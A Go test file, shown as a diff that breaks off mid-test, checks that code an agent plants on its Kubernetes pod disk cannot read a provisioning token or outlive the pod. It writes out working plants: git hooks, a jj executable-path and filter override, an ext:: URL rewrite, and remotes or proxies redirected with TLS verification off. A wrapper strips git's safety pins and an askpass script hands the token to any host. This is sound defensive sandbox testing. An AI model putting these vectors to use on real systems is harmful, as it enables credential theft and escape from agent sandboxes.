@@ -1,0 +1,1141 @@
+package sandbox
+
+import (
+	"archive/tar"
+	"bytes"
+	"context"
+	"crypto/ecdsa"
+	"crypto/elliptic"
+	"crypto/rand"
+	"crypto/tls"
+	"crypto/x509"
+	"crypto/x509/pkix"
+	"encoding/base64"
+	"encoding/pem"
+	"errors"
+	"fmt"
+	"io/fs"
+	"math/big"
+	"net"
+	"net/http"
+	"net/http/cgi"
+	"net/http/httptest"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"slices"
+	"strings"
+	"sync"
+	"testing"
+	"time"
+
+	corev1 "k8s.io/api/core/v1"
+
+	"github.com/sjawhar/legion/daemon/internal/runtime"
+	"github.com/sjawhar/legion/daemon/internal/runtime/shellprefix"
+	"github.com/sjawhar/legion/daemon/internal/testbin"
+	"github.com/sjawhar/legion/daemon/internal/workspace"
+)
+
+// The provisioning token is the implement App's installation token, and every agent of an issue can
+// write the issue's disk, its pod's own generic ephemeral volume. These tests run a pod's init
+// containers exactly as the manifest states them, on this machine, and plant on that disk what an
+// agent of the issue can plant there: nothing planted may ever run where the provisioning Secret is
+// readable, and nothing planted outlives the pod whose disk it is on.
+//
+// What the boundary protects is identity, not a repository-write token kept off the issue's disk:
+// an implement role now holds the implement App's token — the same lease as the
+// provisioning token — read-only in its own gh directory (GHConfigDir), and a review role the
+// review App's. What the fetch container's boundary still keeps is that no review role ever holds
+// the implement App's token, which is what lets the daemon's fix-attempt counting read a push's App
+// from the App that made it. A plant that
+// an agent's own git triggers after provisioning runs under that agent's role: its clone's
+// helper is `legion git-credential` (workspace.GitHubCredentialHelper), which answers from the gh
+// files of the process running it (its LEGION_GH_OWNERS_DIR and GH_CONFIG_DIR), and here, with
+// none, answers nothing (exit 1).
+//
+// Provisioning also pins its git and jj — no hook, the git boot resolved, https alone, a credential
+// scoped to github.com, no working-copy snapshot in a credentialed fetch; internal/workspace's
+// tests prove each. Those pins are defence: the boundary must hold without them. So every git and
+// jj a container starts here is one on which each pin is ineffective, and one whose credential
+// answers any host with the token.
+
+// canaryToken is the provisioning Secret's value in every pod the rig runs.
+const canaryToken = "ghs_canary_the_tree_must_never_read"
+
+// canaryForms are the ways the token can sit in a file: as itself, and base64-encoded inside any
+// payload, such as the Basic credential an http.extraHeader holds, whatever its username. Base64
+// encodes three bytes as four characters, so the token encodes differently at each byte offset
+// modulo three: each form is the run of characters the token's own bytes decide at one offset,
+// without the partial groups at either end.
+var canaryForms = func() []string {
+	forms := []string{canaryToken}
+	for shift := 0; shift < 3; shift++ {
+		encoded := base64.StdEncoding.EncodeToString(append(make([]byte, shift), canaryToken...))
+		start := 0
+		if shift > 0 {
+			start = 4
+		}
+		forms = append(forms, encoded[start:(shift+len(canaryToken))/3*4])
+	}
+	return forms
+}()
+
+// boundaryRepo is the repository every pod provisions (testSpec's).
+const boundaryRepo = "sjawhar/legion-smoke"
+
+// defeatedTool is the git or jj first on every container's PATH: the real one, with every pin
+// provisioning's runner adds made ineffective. The core.hooksPath pin is renamed out of the
+// GIT_CONFIG_* pairs, a credential scoped to github.com is widened to every host, the https-only
+// transport list is dropped, and a process holding the one-shot credential asks the any-host
+// askpass. jj also loses the git.executable-path it is handed and --ignore-working-copy.
+const defeatedTool = `#!/bin/sh
+unset GIT_ALLOW_PROTOCOL
+i=0
+while [ "$i" -lt "${GIT_CONFIG_COUNT:-0}" ]; do
+	eval "key=\${GIT_CONFIG_KEY_$i}"
+	case "$key" in
+		core.hooksPath) export "GIT_CONFIG_KEY_$i=legion.defeated" ;;
+		credential.https://github.com.helper) export "GIT_CONFIG_KEY_$i=credential.helper" ;;
+	esac
+	i=$((i + 1))
+done
+[ -z "$LEGION_PROVISIONING_TOKEN_FILE" ] || export GIT_ASKPASS=@ASKPASS@
+if [ "@NAME@" = jj ]; then
+	for arg; do
+		shift
+		case "$arg" in
+			--config=git.executable-path=*|--ignore-working-copy) ;;
+			*) set -- "$@" "$arg" ;;
+		esac
+	done
+fi
+PATH=@PATH@ exec @REAL@ "$@"
+`
+
+// anyHostAskpass answers every host's prompts with the one-shot credential's token.
+const anyHostAskpass = `#!/bin/sh
+case "$1" in
+	Username*) printf '%s\n' x-access-token ;;
+	*) cat "$LEGION_PROVISIONING_TOKEN_FILE" ;;
+esac
+`
+
+// initRig runs pods' init containers, reaching "github.com" through the cluster's egress proxy: a
+// stand-in that serves boundaryRepo over git's smart HTTP to a request that authenticates as
+// x-access-token with canaryToken.
+type initRig struct {
+	t *testing.T
+	r *Runtime
+	// root holds everything the rig makes; pods holds each pod's volumes and container
+	// filesystems (rigPod), tree is the directory a claim a Sandbox owns maps to, shared by every
+	// pod that mounts the claim and outliving them all, sink is what planted code recorded, and
+	// pattern the canary a probe looks for (off every volume, so no planted file carries it).
+	root, pods, tree, sink, pattern string
+	// bin is ahead of the system's directories on every container's PATH: the defeated git and jj.
+	bin    string
+	legion string
+	github *gitHubStandIn
+	// cache is the repository cache of boundaryRepo the pods' fetch fills its feed from.
+	cache *httptest.Server
+	// network is what every process reaching a remote is told: the egress proxy, the trust store
+	// holding the stand-in's CA, and the hosts reached directly.
+	network []string
+	pod     int
+	// host is the server a plant named, when it named one.
+	host *recordingHost
+}
+
+// rigPod is a pod the rig has started (start) and not yet deleted (delete). Its disk, the volume
+// mounted as issueVolume, is the one volume the pod's agents write: a directory of the pod's own
+// under dir when the manifest makes it a generic ephemeral volume, as it does an issue pod's
+// (issuePod.disk), which the pod keeps across a restart and loses when it is deleted; the
+// rig's tree when the manifest makes it a claim a Sandbox owns.
+type rigPod struct {
+	spec corev1.PodSpec
+	dir  string
+	disk string
+	// inherited is what the disk held when the pod started, before its first init container ran:
+	// nothing, for a pod whose disk is its own.
+	inherited []string
+}
+
+func newInitRig(t *testing.T, legion string) *initRig {
+	t.Helper()
+	r, err := configure(goldenOptions())
+	if err != nil {
+		t.Fatal(err)
+	}
+	root := t.TempDir()
+	rig := &initRig{
+		t: t, r: r, root: root, pods: filepath.Join(root, "pods"), tree: filepath.Join(root, "tree"),
+		sink: filepath.Join(root, "sink"), pattern: filepath.Join(root, "pattern"), bin: filepath.Join(root, "bin"), legion: legion,
+	}
+	for _, dir := range []string{rig.pods, rig.tree, rig.bin} {
+		if err := os.MkdirAll(dir, 0o700); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := os.WriteFile(rig.pattern, []byte(strings.Join(canaryForms, "\n")+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	rig.github = newGitHubStandIn(t, root)
+	rig.cache = newCacheStandIn(t, rig.github.remote)
+	rig.network = []string{
+		"HTTPS_PROXY=" + rig.github.proxy.URL, "https_proxy=" + rig.github.proxy.URL,
+		"NO_PROXY=127.0.0.1,localhost", "no_proxy=127.0.0.1,localhost", "GIT_SSL_CAINFO=" + rig.github.caFile,
+	}
+	askpass := filepath.Join(root, "any-host-askpass")
+	if err := os.WriteFile(askpass, []byte(anyHostAskpass), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	for _, name := range []string{"git", "jj"} {
+		real, err := exec.LookPath(name)
+		if err != nil {
+			t.Fatalf("provisioning's boundary tests drive a real %s: %v", name, err)
+		}
+		// Drop this fixture's PATH prefix before handing off: a host wrapper that searches for
+		// its real tool must not rediscover this defeated-tool wrapper and recurse into it.
+		script := strings.NewReplacer("@NAME@", name, "@REAL@", shellprefix.Literal(real),
+			"@ASKPASS@", shellprefix.Literal(askpass), "@PATH@", shellprefix.Literal(os.Getenv("PATH"))).Replace(defeatedTool)
+		if err := os.WriteFile(filepath.Join(rig.bin, name), []byte(script), 0o700); err != nil {
+			t.Fatal(err)
+		}
+	}
+	return rig
+}
+
+// clone and workspace are where provisioning puts the issue's clone and an issue's workspace on the
+// pod's disk.
+func (pod *rigPod) clone() string {
+	return filepath.Join(pod.disk, "repos", "github.com", "sjawhar", "legion-smoke")
+}
+
+func (pod *rigPod) workspace(issue string) string {
+	return filepath.Join(pod.disk, "workspaces", "sjawhar", "legion-smoke", strings.ToLower(issue))
+}
+
+// probe is a shell command a planted program runs: it appends what it is, and the first copy of
+// the canary it can read on any volume of any pod or on the tree, to the sink.
+func (rig *initRig) probe(what string) string {
+	return fmt.Sprintf(`printf '%%s read=[%%s]\n' %s "$(grep -rhoFf %s %s %s 2>/dev/null | head -n 1)" >> %s`,
+		shellprefix.Literal(what), shellprefix.Literal(rig.pattern), shellprefix.Literal(rig.pods), shellprefix.Literal(rig.tree), shellprefix.Literal(rig.sink))
+}
+
+// script writes an executable that runs probe(what), then tail.
+func (rig *initRig) script(what, tail string) string {
+	rig.t.Helper()
+	path := filepath.Join(rig.root, "planted", what)
+	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
+		rig.t.Fatal(err)
+	}
+	if err := os.WriteFile(path, []byte("#!/bin/sh\n"+rig.probe(what)+"\n"+tail+"\n"), 0o755); err != nil {
+		rig.t.Fatal(err)
+	}
+	return path
+}
+
+// sunk is every line planted code recorded.
+func (rig *initRig) sunk() []string {
+	rig.t.Helper()
+	body, err := os.ReadFile(rig.sink)
+	if errors.Is(err, fs.ErrNotExist) {
+		return nil
+	}
+	if err != nil {
+		rig.t.Fatal(err)
+	}
+	return strings.Split(strings.TrimSpace(string(body)), "\n")
+}
+
+// launch is a pod of spec's claim, as the runtime would create it: its gh bundles minted, so each
+// role's gh volume projects its owners' files.
+func (rig *initRig) launch(spec runtime.SpawnSpec) corev1.PodSpec {
+	rig.t.Helper()
+	l := launchOf(rig.t, rig.r, spec)
+	return rig.r.podTemplate(l).Spec
+}
+
+// start creates a pod of spec and runs its init containers (initialize). The rig starts an issue's
+// next pod only once it has deleted the issue's previous one, as the runtime does.
+func (rig *initRig) start(spec corev1.PodSpec) (*rigPod, error) {
+	rig.t.Helper()
+	rig.pod++
+	pod := &rigPod{spec: spec, dir: filepath.Join(rig.pods, fmt.Sprintf("pod-%d", rig.pod))}
+	return pod, rig.initialize(pod)
+}
+
+// restart runs the pod's init containers again on what the pod keeps, as the kubelet does when it
+// recreates a running pod's sandbox: the pod's own ephemeral volume, whose claim the Pod owns,
+// survives that with whatever its agents wrote on it, and every other volume is made afresh. It is
+// the one way provisioning meets a disk an agent of the issue has written — a retained clone and a
+// workspace that exists — so a test of provisioning against a planted disk opts into it by name.
+func (rig *initRig) restart(pod *rigPod) error {
+	rig.t.Helper()
+	return rig.initialize(pod)
+}
+
+// delete removes the pod, and with it every volume of its own, its disk included when the disk is
+// its own; a claim a Sandbox owns, the tree, stays.
+func (rig *initRig) delete(pod *rigPod) {
+	rig.t.Helper()
+	if err := os.RemoveAll(pod.dir); err != nil {
+		rig.t.Fatal(err)
+	}
+}
+
+// initialize executes the pod's init containers in order, as the kubelet does: each volume a
+// directory — a claim a Sandbox owns the rig's tree, every pod's that mounts it and outliving them
+// all; the pod's generic ephemeral volume a directory of the pod's own, which it keeps until it is
+// deleted; every other volume a directory made for this run of the init containers and removed
+// when they end, since no agent mounts one — and each container a process of the Go legion built
+// from this commit, with the manifest's argv, environment, and working directory, every pod path
+// in them moved to the directory of the volume mounted there.
+// While a container runs, every volume it does not mount, and every other container's filesystem,
+// is unreadable; a read-only mount is not writable. The first container that fails ends the run.
+func (rig *initRig) initialize(pod *rigPod) error {
+	rig.t.Helper()
+	// The rig models the Secret routes the manifest uses; any other would carry the token past it.
+	for _, volume := range pod.spec.Volumes {
+		if volume.Projected != nil && slices.ContainsFunc(volume.Projected.Sources, func(source corev1.VolumeProjection) bool { return source.Secret != nil }) {
+			rig.t.Fatalf("volume %s projects a Secret, which the rig does not model", volume.Name)
+		}
+		if volume.Secret != nil && len(volume.Secret.Items) == 0 {
+			rig.t.Fatalf("volume %s mounts every key of Secret %s, which the rig does not model", volume.Name, volume.Secret.SecretName)
+		}
+	}
+	for _, c := range slices.Concat(pod.spec.InitContainers, pod.spec.Containers) {
+		for _, v := range c.Env {
+			if v.ValueFrom != nil && v.ValueFrom.SecretKeyRef != nil {
+				rig.t.Fatalf("%s reads %s from a Secret, which the rig does not model", c.Name, v.Name)
+			}
+		}
+		if slices.ContainsFunc(c.EnvFrom, func(from corev1.EnvFromSource) bool { return from.SecretRef != nil }) {
+			rig.t.Fatalf("%s takes its environment from a Secret, which the rig does not model", c.Name)
+		}
+	}
+	scratch := []string{filepath.Join(pod.dir, "containers")}
+	defer func() {
+		for _, dir := range scratch {
+			_ = os.RemoveAll(dir)
+		}
+	}()
+	volumes := map[string]string{}
+	for _, volume := range pod.spec.Volumes {
+		dir := filepath.Join(pod.dir, "volumes", volume.Name)
+		switch {
+		case volume.PersistentVolumeClaim != nil:
+			// A claim a Sandbox owns outlives every pod, and every pod that mounts it shares it.
+			dir = rig.tree
+		case volume.Ephemeral != nil:
+			// A generic ephemeral volume is the pod's own: the kubelet creates it with the pod and
+			// deletes it with the pod (INFRA-80), so no other pod, the issue's next included, sees
+			// it, and a restart of the pod finds it as the pod left it.
+		default:
+			scratch = append(scratch, dir)
+		}
+		if dir != rig.tree {
+			if err := os.MkdirAll(dir, 0o700); err != nil {
+				return err
+			}
+		}
+		if volume.Secret != nil {
+			for _, item := range volume.Secret.Items {
+				value := "not-the-provisioning-token"
+				switch item.Key {
+				case provisionTokenKey:
+					value = canaryToken
+				case cacheTokenKey:
+					value = boundaryCacheToken
+				}
+				path := filepath.Join(dir, item.Path)
+				if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
+					return err
+				}
+				if err := os.WriteFile(path, []byte(value), 0o600); err != nil {
+					return err
+				}
+			}
+		}
+		volumes[volume.Name] = dir
+	}
+	if pod.disk == "" {
+		pod.disk = volumes[issueVolume]
+		entries, err := os.ReadDir(pod.disk)
+		if err != nil {
+			return err
+		}
+		for _, entry := range entries {
+			pod.inherited = append(pod.inherited, entry.Name())
+		}
+	}
+	for _, c := range pod.spec.InitContainers {
+		if err := rig.runContainer(pod.dir, volumes, c); err != nil {
+			return err
+		}
+		if c.Name == fetchContainer {
+			rig.holdsNoCanary("the feed", filepath.Join(volumes[issueVolume], feedSubPath))
+		}
+	}
+	return nil
+}
+
+func (rig *initRig) runContainer(podDir string, volumes map[string]string, c corev1.Container) error {
+	local := filepath.Join(podDir, "containers", c.Name)
+	home, tmp := filepath.Join(local, "home"), filepath.Join(local, "tmp")
+	for _, dir := range []string{home, tmp} {
+		if err := os.MkdirAll(dir, 0o700); err != nil {
+			return err
+		}
+	}
+	type move struct{ pod, host string }
+	moves := []move{{podHome, home}}
+	mounted := map[string]bool{local: true}
+	var readOnly []string
+	for _, mount := range c.VolumeMounts {
+		host := filepath.Join(volumes[mount.Name], mount.SubPath)
+		// The kubelet makes a subPath that does not exist yet before it mounts it.
+		if mount.SubPath != "" {
+			if err := os.MkdirAll(host, 0o700); err != nil {
+				return err
+			}
+		}
+		moves = append(moves, move{mount.MountPath, host})
+		mounted[volumes[mount.Name]] = true
+		if mount.ReadOnly {
+			readOnly = append(readOnly, host)
+		}
+	}
+	if !slices.ContainsFunc(moves, func(m move) bool { return m.pod == "/tmp" }) {
+		moves = append(moves, move{"/tmp", tmp})
+	}
+	slices.SortFunc(moves, func(a, b move) int { return len(b.pod) - len(a.pod) })
+	remap := func(value string) string {
+		for _, m := range moves {
+			if value == m.pod || strings.HasPrefix(value, m.pod+"/") {
+				return m.host + value[len(m.pod):]
+			}
+		}
+		return value
+	}
+
+	declared := map[string]string{}
+	for _, v := range c.Env {
+		declared[v.Name] = v.Value
+	}
+	env := []string{}
+	for _, v := range c.Env {
+		value := remap(kubeExpand(v.Value, declared))
+		// The cache's address names its Service in the cluster; here it is the rig's stand-in.
+		if v.Name == "LEGION_REPOSITORY_CACHE_URL" {
+			value = rig.cache.URL
+		}
+		env = append(env, v.Name+"="+value)
+	}
+	if _, set := declared["TMPDIR"]; !set {
+		env = append(env, "TMPDIR="+tmp)
+	}
+	env = append(env, "PATH="+rig.bin+":/usr/bin:/bin", "HOME="+home)
+	env = append(env, rig.network...)
+	argv := make([]string, len(c.Command))
+	for i, arg := range c.Command {
+		argv[i] = remap(kubeExpand(arg, declared))
+	}
+	if argv[0] != rig.r.tools.Legion {
+		return fmt.Errorf("init container %s runs %s, not the Go legion", c.Name, argv[0])
+	}
+	argv[0] = rig.legion
+
+	var hidden []string
+	candidates := []string{rig.tree}
+	for _, parent := range []string{filepath.Join(podDir, "volumes"), filepath.Join(podDir, "containers")} {
+		entries, err := os.ReadDir(parent)
+		if err != nil {
+			return err
+		}
+		for _, entry := range entries {
+			candidates = append(candidates, filepath.Join(parent, entry.Name()))
+		}
+	}
+	for _, dir := range candidates {
+		if !mounted[dir] {
+			if err := os.Chmod(dir, 0); err != nil {
+				return err
+			}
+			hidden = append(hidden, dir)
+		}
+	}
+	for _, dir := range readOnly {
+		if err := chmodTree(dir, false); err != nil {
+			return err
+		}
+	}
+	defer func() {
+		for _, dir := range hidden {
+			_ = os.Chmod(dir, 0o700)
+		}
+		for _, dir := range readOnly {
+			_ = chmodTree(dir, true)
+		}
+	}()
+
+	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
+	defer cancel()
+	command := exec.CommandContext(ctx, argv[0], argv[1:]...)
+	command.Env = env
+	command.Dir = remap(c.WorkingDir)
+	output, err := command.CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("init container %s: %w\n%s", c.Name, err, output)
+	}
+	return nil
+}
+
+// chmodTree adds or removes every owner write permission under dir.
+func chmodTree(dir string, writable bool) error {
+	return filepath.WalkDir(dir, func(path string, entry fs.DirEntry, err error) error {
+		if err != nil {
+			return err
+		}
+		if entry.Type()&fs.ModeSymlink != 0 {
+			return nil
+		}
+		info, err := entry.Info()
+		if err != nil {
+			return err
+		}
+		mode := info.Mode().Perm() &^ 0o222
+		if writable {
+			mode |= 0o200
+		}
+		return os.Chmod(path, mode)
+	})
+}
+
+// git and jj run a defeated tool in the rig's network, as a tree agent's own command would; what
+// it prints is returned, its failure ignored: a live check only needs the planted program to run.
+func (rig *initRig) git(dir string, args ...string) string {
+	rig.t.Helper()
+	return rig.tool(dir, "git", args...)
+}
+
+func (rig *initRig) jj(dir string, args ...string) string {
+	rig.t.Helper()
+	return rig.tool(dir, "jj", args...)
+}
+
+func (rig *initRig) tool(dir, name string, args ...string) string {
+	rig.t.Helper()
+	command := exec.Command(filepath.Join(rig.bin, name), args...)
+	command.Dir = dir
+	command.Env = append([]string{
+		"PATH=" + rig.bin + ":" + os.Getenv("PATH"), "HOME=" + filepath.Join(rig.root, "home"),
+		"XDG_CONFIG_HOME=" + filepath.Join(rig.root, "config"), "JJ_USER=Legion test", "JJ_EMAIL=legion-test@example.invalid",
+		"GIT_CONFIG_GLOBAL=/dev/null", "GIT_TERMINAL_PROMPT=0",
+	}, rig.network...)
+	output, _ := command.CombinedOutput()
+	return string(output)
+}
+
+// holdsNoCanary fails when a file under dir, what names, holds the provisioning token in any of
+// its forms.
+func (rig *initRig) holdsNoCanary(what, dir string) {
+	rig.t.Helper()
+	err := filepath.WalkDir(dir, func(path string, entry fs.DirEntry, err error) error {
+		if err != nil || !entry.Type().IsRegular() {
+			return err
+		}
+		body, err := os.ReadFile(path)
+		if err != nil {
+			return err
+		}
+		for _, form := range canaryForms {
+			if strings.Contains(string(body), form) {
+				rig.t.Errorf("%s holds the provisioning token in %s", what, path)
+			}
+		}
+		return nil
+	})
+	if err != nil {
+		rig.t.Fatalf("walk %s: %v", what, err)
+	}
+}
+
+// plantWorkspaceConfig writes a legacy .jj/workspace-config.toml into a working copy on a pod's
+// disk: jj migrates such a file into the configuration it reads while the workspace has no
+// workspace-config-id. Provisioning's runner removes it before any jj command of its own reads it
+// (internal/workspace, disarmLegacyConfig), so a vector planting one plants it again before its
+// live check: the agent's own command then shows the plant is configuration jj obeys.
+func plantWorkspaceConfig(t *testing.T, dir, toml string) {
+	t.Helper()
+	if err := os.WriteFile(filepath.Join(dir, ".jj", "workspace-config.toml"), []byte(toml), 0o644); err != nil {
+		t.Fatal(err)
+	}
+}
+
+// plantFilter makes every changed .txt file of the working copy at dir pass through a clean filter
+// that runs probe(what), and changes one.
+func (rig *initRig) plantFilter(dir, what string) {
+	rig.t.Helper()
+	filter := rig.script(what, "exec cat")
+	plantWorkspaceConfig(rig.t, dir, "[git.filter]\nenabled = true\n[git.filter.drivers.planted]\nclean = ['"+filter+"']\nsmudge = ['cat']\nrequired = false\n")
+	for name, body := range map[string]string{".gitattributes": "*.txt filter=planted\n", "planted.txt": "changed\n"} {
+		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
+			rig.t.Fatal(err)
+		}
+	}
+}
+
+// plantGit names, in the legacy workspace config of the clone at clone, a git that runs
+// probe("git") before the real one.
+func (rig *initRig) plantGit(clone string) {
+	rig.t.Helper()
+	git, err := exec.LookPath("git")
+	if err != nil {
+		rig.t.Fatal(err)
+	}
+	planted := rig.script("git", "exec "+shellprefix.Literal(git)+` "$@"`)
+	plantWorkspaceConfig(rig.t, clone, "[git]\nexecutable-path = '"+planted+"'\n")
+}
+
+// gitHooks is every hook githooks(5) names.
+var gitHooks = []string{
+	"applypatch-msg", "pre-applypatch", "post-applypatch", "pre-commit", "pre-merge-commit",
+	"prepare-commit-msg", "commit-msg", "post-commit", "pre-rebase", "post-checkout", "post-merge",
+	"pre-push", "pre-receive", "update", "proc-receive", "post-receive", "post-update",
+	"reference-transaction", "push-to-checkout", "pre-auto-gc", "post-rewrite", "sendemail-validate",
+	"fsmonitor-watchman", "p4-changelist", "p4-prepare-changelist", "p4-post-changelist",
+	"p4-pre-submit", "post-index-change",
+}
+
+// plantHooks writes each named hook into dir, each running probe("hook <name>").
+func (rig *initRig) plantHooks(dir string, hooks ...string) {
+	rig.t.Helper()
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		rig.t.Fatal(err)
+	}
+	for _, hook := range hooks {
+		body := "#!/bin/sh\n" + rig.probe("hook "+hook) + "\nexit 0\n"
+		if err := os.WriteFile(filepath.Join(dir, hook), []byte(body), 0o755); err != nil {
+			rig.t.Fatal(err)
+		}
+	}
+}
+
+// An agent of an issue can plant each of these on its pod's disk (the Stage 4b plan's Task 4b.6b;
+// #1286's reviews), and two provisionings follow it, one with the plant in reach and one without:
+//
+//   - The pod's restart (restart): the kubelet runs the pod's init containers again on the disk its
+//     agents left, so provisioning takes the retained-disk paths — the clone kept as it stands
+//     (ensureRepoClone), the workspace brought up to date (update-stale) or added again where it is
+//     gone — with the plant in place. Whatever runs, nothing it runs reads the provisioning token,
+//     no host the plant named receives it, and no file on the disk holds it.
+//   - The issue's next pod, once the first is deleted: its disk is its own (issuePod.disk),
+//     so it starts empty and provisions afresh, and nothing of the plant reaches it — none of the
+//     first pod's files are on its disk, nothing planted runs, and no host the plant named hears
+//     from it. On a disk that outlived the first pod, as a claim a Sandbox owns does, the next pod
+//     would start on the first's files instead.
+//
+// Between the two, each plant is shown live on the first pod's disk, by an agent's own command
+// there triggering it: so its harmlessness on the restart is the boundary's doing, and its absence
+// from the next pod is the fresh disk's.
+func TestWhatAnIssuePlantsNeitherReadsTheProvisioningTokenNorOutlivesItsPod(t *testing.T) {
+	legion := filepath.Join(t.TempDir(), "legion")
+	if output, err := exec.Command("go", "build", "-o", legion, "github.com/sjawhar/legion/daemon/cmd/legion").CombinedOutput(); err != nil {
+		t.Fatalf("build the Go legion: %v\n%s", err, output)
+	}
+	testbin.RequireJJFilters(t)
+
+	type vector struct {
+		name string
+		// plant is what an agent of the issue writes on its pod's disk.
+		plant func(rig *initRig, pod *rigPod)
+		// live triggers the plant on that pod's disk as an agent's own command would.
+		live func(rig *initRig, pod *rigPod)
+	}
+	vectors := []vector{
+		// Every hook git names, in the clone's own hooks directory. The restart's git meets them
+		// in the retained clone; the next pod's clone is a new one, with none of them.
+		{
+			name: "hooks in .git/hooks",
+			plant: func(rig *initRig, pod *rigPod) {
+				rig.plantHooks(filepath.Join(pod.clone(), ".git", "hooks"), gitHooks...)
+			},
+			live: func(rig *initRig, pod *rigPod) { rig.git(pod.clone(), "update-ref", "refs/legion/live", "HEAD") },
+		},
+		// Hooks off the disk, which the clone's configuration names. The restart's git reads that
+		// configuration in the retained clone; the next pod's clone names no hooks, so hooks still
+		// on the host never run for it.
+		{
+			name: "hooks under core.hooksPath",
+			plant: func(rig *initRig, pod *rigPod) {
+				hooks := filepath.Join(rig.root, "planted-hooks")
+				rig.plantHooks(hooks, gitHooks...)
+				rig.git(pod.clone(), "config", "core.hooksPath", hooks)
+			},
+			live: func(rig *initRig, pod *rigPod) { rig.git(pod.clone(), "update-ref", "refs/legion/live", "HEAD") },
+		},
+		// A git of the agent's, named in the clone's legacy workspace config. The restart's jj meets
+		// the file in the retained clone; the next pod's clone has none.
+		{
+			name:  "git.executable-path in the clone's legacy workspace config",
+			plant: func(rig *initRig, pod *rigPod) { rig.plantGit(pod.clone()) },
+			live: func(rig *initRig, pod *rigPod) {
+				rig.plantGit(pod.clone())
+				rig.jj(pod.clone(), "git", "fetch", "-R", pod.clone())
+			},
+		},
+		// A clean filter of the agent's, in the clone's legacy workspace config, and a changed file
+		// it filters. The restart's jj meets both in the retained clone; the next pod's has neither.
+		{
+			name:  "a working-copy filter in the clone",
+			plant: func(rig *initRig, pod *rigPod) { rig.plantFilter(pod.clone(), "clone filter") },
+			live: func(rig *initRig, pod *rigPod) {
+				rig.plantFilter(pod.clone(), "clone filter")
+				rig.jj(pod.clone(), "status", "-R", pod.clone())
+			},
+		},
+		// The repository's URL rewritten to a command of the agent's. The restart's git reads the
+		// rewrite in the retained clone; the next pod's clone has none.
+		{
+			name: "url.<ext::command>.insteadOf",
+			plant: func(rig *initRig, pod *rigPod) {
+				command := rig.script("ext", "exit 1")
+				rig.git(pod.clone(), "config", "protocol.ext.allow", "always")
+				rig.git(pod.clone(), "config", "url.ext::"+command+" %S.insteadOf", "https://github.com/"+boundaryRepo)
+			},
+			live: func(rig *initRig, pod *rigPod) { rig.git(pod.clone(), "ls-remote", "origin") },
+		},
+		// The clone's origin moved to a host of the agent's. The host never receives the token
+		// from the restart, and hears nothing at all from the next pod, whose origin is GitHub.
+		{
+			name: "a remote on another host, answered by any-host credentials",
+			plant: func(rig *initRig, pod *rigPod) {
+				rig.host = newRecordingHost(rig.t, false)
+				rig.git(pod.clone(), "remote", "set-url", "origin", rig.host.server.URL+"/"+boundaryRepo)
+				rig.git(pod.clone(), "config", "http.sslVerify", "false")
+			},
+			live: func(rig *initRig, pod *rigPod) { rig.git(pod.clone(), "ls-remote", "origin") },
+		},
+		// A proxy of the agent's in the clone's configuration. It never receives the token from
+		// the restart, and hears nothing at all from the next pod, whose clone names no proxy.
+		{
+			name: "an http.proxy that terminates TLS, with sslVerify off",
+			plant: func(rig *initRig, pod *rigPod) {
+				rig.host = newRecordingHost(rig.t, true)
+				rig.git(pod.clone(), "config", "http.proxy", rig.host.server.URL)
+				rig.git(pod.clone(), "config", "http.sslVerify", "false")
+			},
+			live: func(rig *initRig, pod *rigPod) { rig.git(pod.clone(), "ls-remote", "origin") },
+		},
+		// post-index-change in the clone's hooks, and the issue's workspace removed, as its agent
+		// can: the restart finds the retained clone and no workspace, so its jj workspace add runs
+		// with the hook in place. The next pod adds its workspace to a new clone with no such hook.
+		{
+			name: "post-index-change, which jj workspace add runs on a restart that finds no workspace",
+			plant: func(rig *initRig, pod *rigPod) {
+				rig.plantHooks(filepath.Join(pod.clone(), ".git", "hooks"), "post-index-change")
+				if err := os.RemoveAll(pod.workspace(testTree)); err != nil {
+					rig.t.Fatal(err)
+				}
+			},
+			live: func(rig *initRig, pod *rigPod) { rig.git(pod.clone(), "read-tree", "HEAD") },
+		},
+		// A clean filter in the issue workspace's own legacy config. The restart finds the
+		// workspace, so its update-stale meets the filter; the issue's next pod finds no workspace
+		// at all and adds one afresh, so the first pod's workspace never reaches it.
+		{
+			name:  "a working-copy filter in the issue workspace's legacy config, which a restart's update-stale runs",
+			plant: func(rig *initRig, pod *rigPod) { rig.plantFilter(pod.workspace(testTree), "workspace filter") },
+			live: func(rig *initRig, pod *rigPod) {
+				rig.plantFilter(pod.workspace(testTree), "workspace filter")
+				rig.jj(pod.workspace(testTree), "status")
+			},
+		},
+	}
+	for _, v := range vectors {
+		t.Run(v.name, func(t *testing.T) {
+			t.Parallel()
+			rig := newInitRig(t, legion)
+			first, err := rig.start(rig.launch(rootSpec(t)))
+			if err != nil {
+				t.Fatalf("the issue's first pod: %v", err)
+			}
+			if rig.github.authorized() == 0 {
+				t.Fatal("the first pod provisioned without presenting the provisioning token to github.com")
+			}
+			v.plant(rig, first)
+
+			// The first pod restarted, on its own disk with the plant in place.
+			if err := rig.restart(first); err != nil {
+				t.Logf("the first pod's restart, with the plant in place: %v", err)
+			}
+			holdsToken := func(text string) bool {
+				return slices.ContainsFunc(canaryForms, func(form string) bool { return strings.Contains(text, form) })
+			}
+			for _, line := range rig.sunk() {
+				if holdsToken(line) {
+					t.Errorf("on the pod's restart, planted code read the provisioning token: %s", line)
+				}
+			}
+			// A server a plant named must never receive the token; its live check is that it
+			// receives anything at all.
+			if rig.host != nil {
+				for _, credential := range rig.host.credentials() {
+					if holdsToken(credential) {
+						t.Errorf("on the pod's restart, the host the plant named received the provisioning token: %s", credential)
+					}
+				}
+			}
+			rig.holdsNoCanary("the first pod's disk", first.disk)
+
+			// The plant is live on the disk it was planted on: an agent's own command there runs it.
+			ran, reached := len(rig.sunk()), 0
+			if rig.host != nil {
+				reached = rig.host.requests()
+			}
+			v.live(rig, first)
+			if rig.host != nil {
+				if rig.host.requests() == reached {
+					t.Fatal("the host the plant named received nothing from an agent's own command on the first pod's disk: the plant is not live")
+				}
+			} else if len(rig.sunk()) == ran {
+				t.Fatal("the plant never ran for an agent's own command on the first pod's disk: it is not live")
+			}
+
